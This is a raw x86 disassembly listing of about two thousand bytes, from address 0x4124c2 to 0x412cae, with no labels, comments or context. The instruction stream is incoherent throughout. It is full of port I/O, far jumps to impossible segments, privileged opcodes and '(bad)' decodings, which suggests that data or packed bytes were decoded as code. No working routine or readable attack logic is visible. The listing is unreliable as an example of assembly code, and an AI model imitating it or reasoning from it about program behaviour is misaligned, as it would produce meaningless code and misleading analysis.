  4124c2:	mov    ebx,DWORD PTR [ecx-0xe0ccb6]
  4124c8:	test   dh,0xee
  4124cb:	and    ebp,0xffffffa9
  4124ce:	in     al,dx
  4124cf:	and    DWORD PTR [eax-0x77],0xffffff8b
  4124d3:	in     eax,0x12
  4124d5:	mov    ?,esi
  4124d7:	xlat   BYTE PTR ds:[ebx]
  4124d8:	out    0x4f,al
  4124da:	dec    eax
  4124db:	or     DWORD PTR [ebx-0x48],0xffffffe3
  4124df:	imul   esp,DWORD PTR [ecx+0x29a39915],0x55ab291b
  4124e9:	xor    BYTE PTR [ecx-0x380a49ec],0xae
  4124f0:	jle    0x412552
  4124f2:	and    eax,0xa1a35e25
  4124f7:	adc    al,0x1a
  4124f9:	loope  0x412577
  4124fb:	shr    dl,cl
  4124fd:	mov    eax,ss:0xc7751c1
  412503:	aaa    
  412504:	mov    ds:0xfac95f2,al
  412509:	mov    eax,0x9653a9ea
  41250e:	push   esi
  41250f:	push   edi
  412510:	or     BYTE PTR [eax-0x2421c4d3],bh
  412516:	loope  0x4124f4
  412518:	or     eax,0x8367b7dd
  41251d:	out    0x2a,eax
  41251f:	call   0x2bb2c9cf
  412524:	test   eax,0xba209d8
  412529:	cmp    al,0x4d
  41252b:	std    
  41252c:	mov    ds:0x1d0ee32d,eax
  412531:	shr    cl,1
  412533:	stos   DWORD PTR es:[edi],eax
  412534:	mov    al,BYTE PTR [ebp+ecx*4+0x6f]
  412538:	fs jl  0x412559
  41253b:	jne    0x4125a5
  41253d:	je     0x41254b
  41253f:	sbb    al,0x7e
  412541:	scas   eax,DWORD PTR es:[edi]
  412542:	retf   0xb588
  412545:	jnp    0x412542
  412547:	xchg   DWORD PTR [edx+0x8],eax
  41254a:	pop    edi
  41254b:	mov    edi,0x87e199aa
  412550:	push   0xbbe805f6
  412555:	sahf   
  412556:	loopne 0x41257e
  412558:	xor    al,BYTE PTR [edi+0x47]
  41255b:	xor    ebx,DWORD PTR [edi+0x72496d3a]
  412561:	enter  0x8621,0x70
  412565:	arpl   WORD PTR [edx],di
  412567:	cmp    esp,DWORD PTR [esi+0x61f04b60]
  41256d:	stos   DWORD PTR es:[edi],eax
  41256e:	push   0x21
  412570:	popa   
  412571:	cwde   
  412572:	jbe    0x412582
  412574:	addr16 inc edi
  412576:	bnd repz jg 0x4125e5
  41257a:	fwait
  41257b:	mov    dh,0x74
  41257d:	push   eax
  41257e:	ins    BYTE PTR es:[edi],dx
  41257f:	aad    0x62
  412581:	lock dec eax
  412583:	pop    ss
  412584:	repz add edi,DWORD PTR ds:0x1169c700
  41258b:	repnz dec ebx
  41258d:	retf   0x5961
  412590:	bound  ecx,QWORD PTR [eax+0x234ddc76]
  412596:	ret    
  412597:	cmp    bl,ah
  412599:	inc    esp
  41259a:	pusha  
  41259b:	loopne 0x412617
  41259d:	or     BYTE PTR [eax],0x8a
  4125a0:	jmp    0x4125c5
  4125a2:	mov    ah,BYTE PTR [esi]
  4125a4:	mov    ch,0x60
  4125a6:	cmp    cx,si
  4125a9:	xchg   edi,eax
  4125aa:	xor    DWORD PTR [esp+edx*2],0x8746890c
  4125b1:	add    al,0xbd
  4125b3:	and    ch,ch
  4125b5:	sbb    ecx,DWORD PTR [ebx+0x3217ac2c]
  4125bb:	sahf   
  4125bc:	mov    ecx,0x5d2c120d
  4125c1:	add    esi,eax
  4125c3:	cli    
  4125c4:	retf   0xbcaa
  4125c7:	shl    DWORD PTR [edi+0x56],0x90
  4125cb:	ins    DWORD PTR es:[edi],dx
  4125cc:	mov    ch,0x99
  4125ce:	mov    ds:0x9311ce,al
  4125d3:	inc    eax
  4125d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125d5:	ret    
  4125d6:	into   
  4125d7:	adc    bl,bl
  4125d9:	imul   esp,DWORD PTR [edi-0x3d1ad0b1],0x547af7f0
  4125e3:	jnp    0x4125fe
  4125e5:	and    esp,ecx
  4125e7:	nop
  4125e8:	xchg   edi,eax
  4125e9:	out    dx,eax
  4125ea:	jge    0x41266b
  4125ec:	and    eax,0xd8d50c34
  4125f1:	sahf   
  4125f2:	inc    esi
  4125f3:	xor    DWORD PTR [esi+0x2],edi
  4125f6:	add    esi,DWORD PTR [ebx]
  4125f8:	in     eax,dx
  4125f9:	and    ebp,DWORD PTR [eax-0x2031d27e]
  4125ff:	mov    ebp,0x14f34abc
  412604:	mov    edx,0x95bf6098
  412609:	loope  0x412608
  41260b:	fsubr  QWORD PTR [ebp+0x379d6ace]
  412611:	(bad)  
  412612:	std    
  412613:	enter  0xbb2b,0x60
  412617:	jne    0x4125ab
  412619:	lods   eax,DWORD PTR ds:[esi]
  41261a:	stos   BYTE PTR es:[edi],al
  41261b:	aad    0xc2
  41261d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41261e:	ss xor eax,0xe2c18367
  412624:	dec    edi
  412625:	cli    
  412626:	aas    
  412627:	push   ss
  412628:	fst    st(0)
  41262a:	add    eax,0xdd75dc0f
  41262f:	mov    al,ds:0xbaa8281e
  412634:	bound  ebp,QWORD PTR [eax]
  412636:	out    0x99,eax
  412638:	xor    eax,0x31de68b7
  41263d:	inc    esp
  41263e:	out    dx,al
  41263f:	xchg   esp,eax
  412640:	jl     0x41263b
  412642:	mov    dl,0x7e
  412644:	inc    ecx
  412645:	adc    esp,DWORD PTR [edi+0x51d0f1d]
  41264b:	add    esi,ebx
  41264d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41264e:	adc    DWORD PTR [eax-0x44458010],esp
  412654:	sar    edi,0x66
  412657:	retf   0xee03
  41265a:	mov    ds:0x3484f0b4,eax
  41265f:	add    esp,DWORD PTR [eax]
  412661:	data16 cmp BYTE PTR [edx-0x61],bl
  412665:	iret   
  412666:	mov    eax,0xc20f994b
  41266b:	(bad)  
  41266c:	mov    dl,0x11
  41266e:	gs push esp
  412670:	mov    ebx,0x81fa4969
  412675:	pop    esi
  412676:	jge    0x412641
  412678:	sub    al,0xff
  41267a:	neg    eax
  41267c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41267d:	popf   
  41267e:	inc    di
  412680:	(bad)  
  412681:	jg     0x412611
  412683:	mov    cl,0xd4
  412685:	add    edx,DWORD PTR [ecx+0x26]
  412688:	inc    ecx
  412689:	inc    edx
  41268a:	sbb    ch,cl
  41268c:	ret    0xb0f3
  41268f:	mov    cl,0x4c
  412691:	outs   dx,BYTE PTR ds:[esi]
  412692:	pop    ds
  412693:	cwde   
  412694:	outs   dx,BYTE PTR ds:[esi]
  412695:	pop    edx
  412696:	jle    0x412663
  412698:	call   0x57f4:0x73ebcab2
  41269f:	gs jae 0x4126a8
  4126a2:	in     eax,0xa
  4126a4:	sub    DWORD PTR [ebx],0xb7307e03
  4126aa:	icebp  
  4126ab:	test   DWORD PTR [ecx],ebx
  4126ad:	mov    dh,0x90
  4126af:	pop    ds
  4126b0:	aas    
  4126b1:	xor    DWORD PTR [edx+0x78c08067],0x228806ca
  4126bb:	arpl   WORD PTR [ebx],cx
  4126bd:	pop    edx
  4126be:	mov    dh,0x57
  4126c0:	pop    ecx
  4126c1:	mov    DWORD PTR [eax+0x5c535d58],ecx
  4126c7:	ret    
  4126c8:	xchg   cl,dl
  4126ca:	dec    edx
  4126cb:	pop    ss
  4126cc:	inc    esp
  4126cd:	adc    eax,0x7cbf7a03
  4126d2:	std    
  4126d3:	push   0x0
  4126d5:	adc    esp,ecx
  4126d7:	mov    al,0xa1
  4126d9:	mov    ecx,0x3b8618c0
  4126de:	adc    BYTE PTR [ecx-0x12],bl
  4126e1:	cdq    
  4126e2:	inc    esi
  4126e3:	(bad)  
  4126e4:	mov    esp,DWORD PTR [ebx+esi*1+0x3]
  4126e8:	adc    eax,0xf658a350
  4126ed:	outs   dx,DWORD PTR ds:[esi]
  4126ee:	mov    gs,WORD PTR [ebp+ecx*8-0x59c7b189]
  4126f5:	cmp    al,0x2c
  4126f7:	mov    esp,0x3c8d9693
  4126fc:	jl     0x41274f
  4126fe:	ret    0x43c
  412701:	push   ss
  412702:	push   0xb
  412704:	xchg   esp,eax
  412705:	je     0x412734
  412707:	dec    ecx
  412708:	xchg   esi,edx
  41270a:	mov    dl,0x40
  41270c:	test   al,al
  41270e:	adc    eax,0xff2f044c
  412713:	inc    edx
  412714:	cwde   
  412715:	pushf  
  412716:	mov    dh,0xb2
  412718:	pusha  
  412719:	(bad)  
  41271a:	(bad)  
  41271b:	push   ecx
  41271c:	cmp    edx,ebx
  41271e:	call   0xa31f:0x2294e5f
  412725:	fmul   st(2),st
  412727:	fs jo  0x412786
  41272a:	data16 jbe 0x41272c
  41272d:	out    0x41,al
  41272f:	xchg   esp,eax
  412730:	jg     0x412702
  412732:	call   0x44f5:0x63af0312
  412739:	not    esp
  41273b:	and    bl,ch
  41273d:	sahf   
  41273e:	fcmove st,st(7)
  412740:	or     eax,0x4b9287f5
  412745:	pop    ds
  412746:	jmp    0x4126db
  412748:	lods   al,BYTE PTR ds:[esi]
  412749:	mov    cl,0x1d
  41274b:	mov    ebx,0x6ac8e108
  412750:	add    ch,BYTE PTR [eax-0x26d7a055]
  412756:	cld    
  412757:	out    0x58,eax
  412759:	adc    eax,0xac232a69
  41275e:	and    al,0xee
  412760:	push   ecx
  412761:	and    eax,0x35d48d43
  412766:	repnz or BYTE PTR [ecx],dl
  412769:	dec    esp
  41276a:	ins    BYTE PTR es:[edi],dx
  41276b:	mov    ch,bh
  41276d:	in     eax,dx
  41276e:	mov    al,ds:0x2fa2fe87
  412773:	iret   
  412774:	cmp    DWORD PTR [ecx+0x41c3217d],eax
  41277a:	dec    eax
  41277b:	mov    ch,0x44
  41277d:	pusha  
  41277e:	xchg   edx,eax
  41277f:	jmp    0x7e3c:0x23a2c9bb
  412786:	daa    
  412787:	adc    edx,DWORD PTR [eax-0x519e1482]
  41278d:	and    DWORD PTR [ecx+0x37c06670],esp
  412793:	mov    BYTE PTR [ebx+0x704175b2],al
  412799:	cli    
  41279a:	jmp    0x41277e
  41279c:	adc    eax,0xc676afff
  4127a1:	push   ds
  4127a2:	dec    eax
  4127a3:	sbb    bh,BYTE PTR [ebx]
  4127a5:	mov    edi,0x610af0e
  4127aa:	pushf  
  4127ab:	ins    BYTE PTR es:[edi],dx
  4127ac:	(bad)
  4127b1:	or     ah,BYTE PTR [esp+ebp*1+0x4e240142]
  4127b8:	push   ebp
  4127b9:	xchg   ebx,eax
  4127ba:	iret   
  4127bb:	cwde   
  4127bc:	xchg   ebx,eax
  4127bd:	mov    edi,0x4f09d330
  4127c2:	nop
  4127c3:	or     al,0x4f
  4127c5:	fdiv   DWORD PTR [edi*4+0x5fd40c03]
  4127cc:	push   0xffffff98
  4127ce:	scas   eax,DWORD PTR es:[edi]
  4127cf:	inc    edx
  4127d0:	and    edx,DWORD PTR [ebx-0x6a364e2c]
  4127d6:	xor    DWORD PTR [ebp+edx*2+0x6a4221ac],eax
  4127dd:	push   edx
  4127de:	ss das 
  4127e0:	into   
  4127e1:	cmp    ebp,edi
  4127e3:	pop    ebx
  4127e4:	mov    eax,ds:0x16befb0d
  4127e9:	(bad)  
  4127ea:	scas   eax,DWORD PTR es:[edi]
  4127eb:	mov    bl,0xbb
  4127ed:	fsub   DWORD PTR [edi+0x42]
  4127f0:	clc    
  4127f1:	cmc    
  4127f2:	sub    al,0x69
  4127f4:	and    DWORD PTR [ebp+ebp*2-0x5f],0x7
  4127f9:	into   
  4127fa:	or     al,0x23
  4127fc:	mov    ah,0x0
  4127fe:	imul   ebp,DWORD PTR [ebp+0x11573c28],0xcc3e9e8d
  412808:	lods   al,BYTE PTR ds:[esi]
  412809:	pop    ss
  41280a:	lods   al,BYTE PTR ds:[esi]
  41280b:	xchg   esp,eax
  41280c:	push   edi
  41280d:	lock adc BYTE PTR [edx+0x58],cl
  412811:	pop    eax
  412812:	or     BYTE PTR [ecx],bh
  412814:	sbb    DWORD PTR [ebp-0x36c196a4],ebp
  41281a:	call   0x56bbb7d6
  41281f:	adc    DWORD PTR [esi+0x537ae85a],ebx
  412825:	push   0x7f69ac3
  41282a:	inc    edi
  41282b:	lahf   
  41282c:	mov    edx,0xdfdbf720
  412831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412832:	adc    eax,0x65920c7a
  412837:	mov    esi,0x57c50d87
  41283c:	push   esp
  41283d:	inc    esp
  41283e:	sbb    bl,cl
  412840:	add    bl,BYTE PTR [eax+0x18]
  412843:	nop
  412844:	out    dx,eax
  412845:	push   ebp
  412846:	xchg   edx,eax
  412847:	push   es
  412848:	out    0x2a,al
  41284a:	sbb    DWORD PTR [eax],ebp
  41284c:	jg     0x412851
  41284e:	push   esi
  41284f:	pop    es
  412850:	mov    ecx,0x246d34ad
  412855:	lock call DWORD PTR [ebp+0x2e]
  412859:	out    dx,al
  41285a:	aas    
  41285b:	mov    al,0x13
  41285e:	(bad)  
  412860:	sbb    eax,0x45754b22
  412865:	pop    esp
  412866:	fstp   QWORD PTR [esi+0x61ff639b]
  41286c:	loope  0x41280b
  41286e:	cmp    cl,BYTE PTR [esi]
  412870:	aam    0x53
  412872:	ins    DWORD PTR es:[edi],dx
  412873:	jno    0x412828
  412875:	arpl   sp,bp
  412877:	mov    bh,0xc3
  412879:	xchg   edx,eax
  41287a:	jmp    0x70dc2ba1
  41287f:	mov    ds:0x6e86d713,eax
  412884:	fs xchg edx,eax
  412886:	lds    ebp,FWORD PTR [ecx+0x2d]
  412889:	jo     0x4128e3
  41288b:	or     eax,0x498a1e51
  412890:	cmp    bl,BYTE PTR [ebx]
  412892:	jp     0x4128fb
  412894:	cmp    DWORD PTR [ebx+0x1289c7b3],ebx
  41289a:	test   DWORD PTR [edi-0x7250355e],ecx
  4128a0:	jo     0x412868
  4128a2:	popw   es
  4128a4:	mov    bl,0xf0
  4128a6:	pop    ds
  4128a7:	cmp    BYTE PTR [ecx],ah
  4128a9:	mov    dl,0x84
  4128ab:	mov    ah,0x7b
  4128ad:	pop    eax
  4128ae:	fldcw  WORD PTR [eax+0x33e5d526]
  4128b4:	test   BYTE PTR gs:[edi-0x3c],cl
  4128b8:	add    ebp,DWORD PTR [esi]
  4128ba:	or     eax,0xf1e35a0
  4128bf:	mov    eax,ds:0xda6e11ed
  4128c4:	fs mov ah,0xc3
  4128c7:	outs   dx,DWORD PTR ds:[esi]
  4128c8:	sub    DWORD PTR [edi-0x39],edx
  4128cb:	(bad)  
  4128cc:	mov    ecx,0x9e35707d
  4128d1:	dec    edx
  4128d2:	dec    edx
  4128d3:	cmp    ebp,edi
  4128d5:	sbb    DWORD PTR [eax+0x1e],edx
  4128d8:	ja     0x4128d6
  4128da:	pop    edi
  4128db:	adc    BYTE PTR es:[di-0x4b2d],dh
  4128e1:	ficom  DWORD PTR [edi+0x53]
  4128e4:	sahf   
  4128e5:	stos   DWORD PTR es:[edi],eax
  4128e6:	stos   BYTE PTR es:[edi],al
  4128e7:	repz in al,0x45
  4128ea:	sbb    bl,ah
  4128ec:	or     DWORD PTR [esi+ebp*1+0x1],ebp
  4128f0:	sbb    DWORD PTR [esi-0x1e],0xfffffffe
  4128f4:	add    ebx,DWORD PTR [edi]
  4128f6:	paddd  mm4,QWORD PTR [edx]
  4128f9:	test   al,0x8
  4128fb:	inc    edi
  4128fc:	into   
  4128fd:	pop    edi
  4128fe:	and    DWORD PTR [esi],ebp
  412900:	xchg   ecx,eax
  412901:	sub    edi,esi
  412903:	dec    esi
  412904:	sub    ecx,ebx
  412906:	idiv   BYTE PTR [ecx]
  412908:	or     DWORD PTR [ecx-0x2],eax
  41290b:	mov    WORD PTR [ebx+0x7e],fs
  41290e:	es mov al,0x48
  412911:	xchg   BYTE PTR [ebp+0x71715f71],ch
  412917:	call   0x2ead0213
  41291c:	jae    0x412915
  41291e:	jmp    0xb073:0xb5d95800
  412925:	xor    BYTE PTR [edx-0x3878b8c8],0x48
  41292c:	test   al,al
  41292e:	adc    BYTE PTR [edi],ah
  412930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412931:	dec    esi
  412932:	cmp    dl,BYTE PTR [ecx]
  412934:	mov    ds:0x6e6ced26,eax
  412939:	sbb    BYTE PTR [ebp+0x28],0xb1
  41293d:	repnz or DWORD PTR [ebx-0x5ca42e41],eax
  412944:	sar    DWORD PTR ss:[ecx-0x3f39ccf2],0x32
  41294c:	jge    0x4128dd
  41294e:	mov    ch,0x97
  412950:	shr    BYTE PTR [ecx],cl
  412952:	sub    esi,DWORD PTR [eax+ecx*2+0x38]
  412956:	in     al,0x60
  412958:	retf   0x847
  41295b:	mov    BYTE PTR [edi-0x70a23acb],bl
  412961:	xchg   esp,eax
  412963:	stos   DWORD PTR es:[edi],eax
  412964:	das    
  412965:	jle    0x4129c9
  412967:	pop    esp
  412968:	mov    ds:0xe4a46612,eax
  41296d:	popf   
  41296e:	push   esp
  41296f:	out    0xc5,eax
  412971:	push   ss
  412972:	cli    
  412973:	repnz adc edi,DWORD PTR [eax+0x5c]
  412977:	mov    BYTE PTR fs:[ecx+0x4959ecd1],dl
  41297e:	pop    ecx
  41297f:	jmp    0x412949
  412981:	inc    edi
  412982:	mov    al,0x26
  412984:	inc    edi
  412985:	and    BYTE PTR [esi],bl
  412987:	test   al,0x25
  412989:	xchg   ebp,eax
  41298a:	pop    es
  41298b:	es dec esi
  41298d:	sbb    BYTE PTR [edi+0x18bdb855],0xd3
  412994:	and    dh,BYTE PTR [edx+ebp*2+0x5d]
  412998:	int3   
  412999:	scas   al,BYTE PTR es:[edi]
  41299a:	imul   edi,DWORD PTR [esi],0x16
  41299d:	les    edx,FWORD PTR [ecx]
  41299f:	push   ecx
  4129a0:	outs   dx,BYTE PTR ds:[esi]
  4129a1:	mov    al,ds:0x771847ca
  4129a6:	sub    eax,DWORD PTR ds:0x717167cb
  4129ac:	mov    eax,0xee8ffb5d
  4129b1:	xchg   DWORD PTR [edx+0x5a],ebx
  4129b4:	into   
  4129b5:	add    eax,0x98a3352f
  4129ba:	dec    ecx
  4129bb:	cmp    dh,bl
  4129bd:	test   BYTE PTR [ecx+0x41],bh
  4129c0:	jne    0x4129de
  4129c2:	jle    0x412a38
  4129c4:	test   BYTE PTR [ebx+0x3e],dl
  4129c7:	daa    
  4129c8:	icebp  
  4129c9:	pop    ebp
  4129ca:	xchg   BYTE PTR [ecx-0x24f49f9d],ah
  4129d0:	arpl   WORD PTR [ecx+0x57],cx
  4129d3:	jbe    0x412959
  4129d5:	inc    ebx
  4129d6:	mov    ah,0xd
  4129d8:	lds    eax,FWORD PTR [eax]
  4129da:	inc    esi
  4129db:	xchg   ebx,eax
  4129dc:	out    0xd3,eax
  4129de:	imul   ecx,ebx,0x2e
  4129e1:	adc    ah,BYTE PTR [ecx]
  4129e3:	pop    ss
  4129e4:	push   ebp
  4129e5:	pop    edx
  4129e6:	sbb    ch,dh
  4129e8:	(bad)  
  4129e9:	out    0x5,eax
  4129eb:	jns    0x41297f
  4129ed:	xor    DWORD PTR [ebx-0x19],esi
  4129f0:	icebp  
  4129f1:	adc    DWORD PTR [ebp-0x4],ecx
  4129f4:	mov    edi,DWORD PTR [esi+0x48]
  4129f7:	jnp    0x4129f8
  4129f9:	(bad)  
  4129fa:	loop   0x4129fc
  4129fc:	add    al,0x19
  4129fe:	add    DWORD PTR [ecx-0x2556182e],ebx
  412a04:	cmp    dl,BYTE PTR [esi-0x1c]
  412a07:	cmp    al,BYTE PTR [edx+0x7c0f1b2c]
  412a0d:	push   0x64
  412a0f:	xor    dl,bl
  412a11:	rol    edi,0x89
  412a14:	pop    edx
  412a15:	lods   eax,DWORD PTR ds:[esi]
  412a16:	in     eax,0xd8
  412a18:	mov    eax,0x8f7f4218
  412a1d:	sub    BYTE PTR [ecx-0x74d0a2a3],dh
  412a23:	mov    bl,0x22
  412a25:	or     ecx,DWORD PTR [eax+0x4]
  412a28:	iret   
  412a29:	sbb    ch,al
  412a2b:	in     eax,0x72
  412a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a2e:	adc    ah,BYTE PTR [esi-0x14c023e2]
  412a34:	xchg   edi,eax
  412a35:	mov    WORD PTR [esi+0x19],ss
  412a38:	sbb    DWORD PTR [esi+eax*1+0x7c],ebp
  412a3c:	or     esi,DWORD PTR [ecx]
  412a3e:	or     DWORD PTR [edx+0x1a595066],edx
  412a44:	imul   esp,DWORD PTR [ebp+0x3f],0x33
  412a48:	sub    eax,0x1f5e32af
  412a4d:	out    0x8f,al
  412a4f:	dec    esi
  412a50:	and    ecx,edx
  412a52:	lods   al,BYTE PTR ds:[esi]
  412a53:	gs addr16 pop eax
  412a56:	call   0x75c0427d
  412a5b:	xchg   DWORD PTR [esi-0x33cca0b],ecx
  412a61:	ja     0x4129f5
  412a63:	xor    eax,0x23035177
  412a68:	icebp  
  412a69:	xchg   DWORD PTR [ebp+0x73],esp
  412a6c:	add    DWORD PTR [ebp+0x5b],esp
  412a6f:	pusha  
  412a70:	push   ecx
  412a71:	sub    DWORD PTR [eax],eax
  412a73:	push   ebx
  412a74:	sub    bh,dl
  412a76:	cli    
  412a77:	retf   0xd225
  412a7a:	out    0xae,al
  412a7c:	dec    ecx
  412a7d:	data16 out 0x78,al
  412a80:	out    0x30,al
  412a82:	addr16 retf 0x6633
  412a86:	jb     0x412af0
  412a88:	hlt    
  412a89:	or     ebp,ecx
  412a8b:	aam    0x7f
  412a8d:	adc    ecx,DWORD PTR ds:0x3e4a9ee7
  412a93:	repnz or DWORD PTR [ebp+ebp*1+0x49],esp
  412a98:	aad    0x9c
  412a9a:	adc    DWORD PTR [eax+0x220267f0],ecx
  412aa0:	dec    edi
  412aa1:	cli    
  412aa2:	imul   ebp,DWORD PTR [ecx+0x607261f4],0x1c3a561
  412aac:	(bad)  ss:[edx-0x5b]
  412ab0:	arpl   WORD PTR [eax-0xc1af671],di
  412ab6:	repz inc edx
  412ab8:	dec    esp
  412ab9:	dec    edi
  412aba:	ret    0xfca9
  412abd:	repz aad 0xf5
  412ac0:	mov    dl,cl
  412ac2:	(bad)  
  412ac3:	std    
  412ac4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ac5:	xor    DWORD PTR ds:0x630154e3,edi
  412acb:	pop    esi
  412acc:	in     eax,0xa1
  412ace:	ins    DWORD PTR es:[edi],dx
  412acf:	out    dx,eax
  412ad0:	jbe    0x412a9c
  412ad2:	fldenv [edi+0x4e]
  412ad5:	jmp    0xca2558d9
  412ada:	mov    ebp,0xe9c0fbc6
  412adf:	push   esp
  412ae0:	pause  
  412ae2:	out    0x87,eax
  412ae4:	ins    BYTE PTR es:[edi],dx
  412ae5:	mov    dl,BYTE PTR [eax]
  412ae7:	outs   dx,BYTE PTR ds:[esi]
  412ae8:	xlat   BYTE PTR ds:[ebx]
  412ae9:	clc    
  412aea:	jns    0x412b3a
  412aec:	xor    eax,0xe32ba548
  412af1:	jl     0x412b38
  412af3:	xchg   esp,eax
  412af4:	sub    al,0x79
  412af6:	mov    al,0x52
  412af8:	ret    0x7c4
  412afb:	data16 sub BYTE PTR [edi-0xd8ed38f],ah
  412b02:	xor    edi,eax
  412b04:	inc    edx
  412b05:	shl    ch,cl
  412b07:	xor    DWORD PTR [ebx-0x1b],edi
  412b0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b0b:	pop    es
  412b0c:	outs   dx,DWORD PTR ds:[esi]
  412b0d:	mov    ebx,0xf6797479
  412b12:	rcl    DWORD PTR [edi],0x66
  412b15:	pop    eax
  412b16:	rcr    DWORD PTR [esi+0x3946607d],cl
  412b1c:	inc    ecx
  412b1d:	pop    ecx
  412b1e:	aad    0x89
  412b20:	inc    edx
  412b21:	cmp    esp,esi
  412b23:	shl    BYTE PTR [ebp-0x80],0x92
  412b27:	iret   
  412b28:	(bad)  
  412b29:	ja     0x412b5f
  412b2b:	les    ebp,FWORD PTR [edi+eiz*1+0x72bd2e45]
  412b32:	scas   eax,DWORD PTR es:[edi]
  412b33:	es cdq 
  412b35:	push   cs
  412b36:	(bad)  
  412b37:	xor    edx,DWORD PTR [ecx]
  412b39:	lods   eax,DWORD PTR ds:[esi]
  412b3a:	push   esp
  412b3b:	nop
  412b3c:	outs   dx,DWORD PTR ds:[esi]
  412b3d:	div    DWORD PTR [edx*1+0x431a0ab1]
  412b44:	pop    esi
  412b45:	ins    DWORD PTR es:[edi],dx
  412b46:	cwde   
  412b47:	aas    
  412b48:	cld    
  412b49:	push   ds
  412b4a:	jmp    0x2f36729
  412b4f:	mov    gs,WORD PTR [esi+ebx*1+0x20375a6d]
  412b56:	sub    al,0xbd
  412b58:	sahf   
  412b59:	stos   DWORD PTR es:[edi],eax
  412b5a:	int    0x50
  412b5c:	jnp    0x412b0c
  412b5e:	hlt    
  412b5f:	sar    DWORD PTR [edx+0xb],0x40
  412b63:	(bad)  
  412b64:	stos   DWORD PTR es:[edi],eax
  412b65:	psrld  mm6,QWORD PTR [ecx-0x1da5cd39]
  412b6c:	(bad)  
  412b6d:	dec    ebp
  412b6e:	stos   DWORD PTR es:[edi],eax
  412b6f:	cli    
  412b70:	test   al,0xda
  412b72:	jp     0x412afd
  412b74:	fcom   DWORD PTR [edx-0x9]
  412b77:	sbb    bh,BYTE PTR [esi+0x13f6c568]
  412b7d:	mov    bl,BYTE PTR [ebp+edi*4-0x3fb3f15e]
  412b84:	leave  
  412b85:	xchg   edx,eax
  412b86:	shl    DWORD PTR [esi+0x7a],cl
  412b89:	mov    al,0xc5
  412b8b:	jmp    0x4c9263bf
  412b90:	test   eax,0x7f306e87
  412b95:	sbb    DWORD PTR [eax],esp
  412b97:	xchg   esi,eax
  412b98:	sti    
  412b99:	push   eax
  412b9a:	ins    BYTE PTR es:[edi],dx
  412b9b:	cld    
  412b9c:	adc    BYTE PTR es:[edi+0x11],0x60
  412ba1:	sbb    esp,esi
  412ba3:	inc    esp
  412ba4:	xchg   dl,cl
  412ba6:	fild   QWORD PTR [ebx-0x5b]
  412ba9:	pop    es
  412baa:	daa    
  412bab:	shl    DWORD PTR [eax+eax*8-0x12],cl
  412baf:	push   ebp
  412bb0:	sbb    cl,BYTE PTR [ebx+0x875d5dc]
  412bb6:	(bad)  
  412bb7:	(bad)  
  412bb8:	int3   
  412bb9:	push   es
  412bba:	das    
  412bbb:	test   eax,0xad8c8428
  412bc0:	xchg   esp,eax
  412bc1:	call   0xbb9e:0x9e0ea2c3
  412bc8:	xor    dl,BYTE PTR [ecx]
  412bca:	arpl   WORD PTR [ebx+0x59],sp
  412bcd:	loop   0x412b55
  412bcf:	sahf   
  412bd0:	jns    0x412bea
  412bd2:	push   0xffffffc7
  412bd4:	icebp  
  412bd5:	jnp    0x412b59
  412bd7:	pop    es
  412bd8:	or     BYTE PTR [edx+ecx*1+0x3e],bl
  412bdc:	xchg   ecx,eax
  412bdd:	inc    ebx
  412bde:	sbb    esi,DWORD PTR [edx]
  412be0:	sub    DWORD PTR [ebx-0x1f59a6e4],edi
  412be6:	in     al,0x77
  412be8:	add    BYTE PTR [ebp+0xace2383],0xa8
  412bef:	fadd   DWORD PTR [ecx+0x326e84d2]
  412bf5:	dec    DWORD PTR [esi+0x614b0477]
  412bfb:	mov    cl,0xd
  412bfd:	pop    esp
  412bfe:	inc    edi
  412bff:	sub    ebp,DWORD PTR [eax-0x250d5127]
  412c05:	pop    edi
  412c06:	sti    
  412c07:	rcl    dl,1
  412c09:	repnz sub ebx,edi
  412c0c:	clc    
  412c0d:	out    0xb,al
  412c0f:	sub    DWORD PTR [ebp+ebp*2-0x6d6cd038],edx
  412c16:	xchg   ecx,eax
  412c17:	popa   
  412c18:	call   0x81b8:0x70b0ad92
  412c1f:	add    al,0xa4
  412c21:	aad    0x8
  412c23:	sbb    esp,0x3361a934
  412c29:	pop    ds
  412c2a:	adc    al,0xc3
  412c2c:	popf   
  412c2d:	adc    cl,BYTE PTR [edi]
  412c2f:	jg     0x412bb2
  412c31:	sub    dh,BYTE PTR [edi+0x2a]
  412c34:	stc    
  412c35:	repz xchg ebp,eax
  412c37:	stos   BYTE PTR es:[edi],al
  412c38:	shl    DWORD PTR [ebp-0xbbec59e],1
  412c3e:	jge    0x412c07
  412c40:	jno    0x412c5d
  412c42:	cmc    
  412c43:	imul   edx,DWORD PTR [edx],0x3497a7d9
  412c49:	or     DWORD PTR [edx+0x36],esp
  412c4c:	loopne 0x412c7d
  412c4e:	lods   al,BYTE PTR ds:[esi]
  412c4f:	sub    al,0x6
  412c51:	nop
  412c52:	sub    al,0xf4
  412c54:	jae    0x412c98
  412c56:	sub    ah,BYTE PTR [ecx+0x76cfb1b3]
  412c5c:	sbb    dl,ch
  412c5e:	mov    ebx,0xf18fc218
  412c63:	loope  0x412c94
  412c65:	int    0xe5
  412c67:	jecxz  0x412c4e
  412c69:	mov    edi,es
  412c6b:	mov    ah,0x7b
  412c6d:	mov    al,ds:0xb8cf064b
  412c72:	sar    DWORD PTR [esi-0x20ef69fc],cl
  412c78:	mov    BYTE PTR [eax+0x4f],cl
  412c7b:	retf   
  412c7c:	leave  
  412c7d:	cmp    ecx,DWORD PTR [esp+eiz*8+0x6878881]
  412c84:	jb     0x412c80
  412c86:	xchg   ecx,eax
  412c87:	imul   edx,DWORD PTR [esi-0x5045cf1e],0x30
  412c8e:	adc    ah,BYTE PTR [ebp-0x1566cda6]
  412c94:	add    al,0x42
  412c96:	mov    bl,BYTE PTR [esi+0x4cfca9ee]
  412c9c:	pop    esi
  412c9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c9e:	popf   
  412c9f:	into   
  412ca0:	jmp    0x31e3:0xe892532
  412ca7:	jmp    0xfd12:0x5c93c341
  412cae:	retf   0xd929
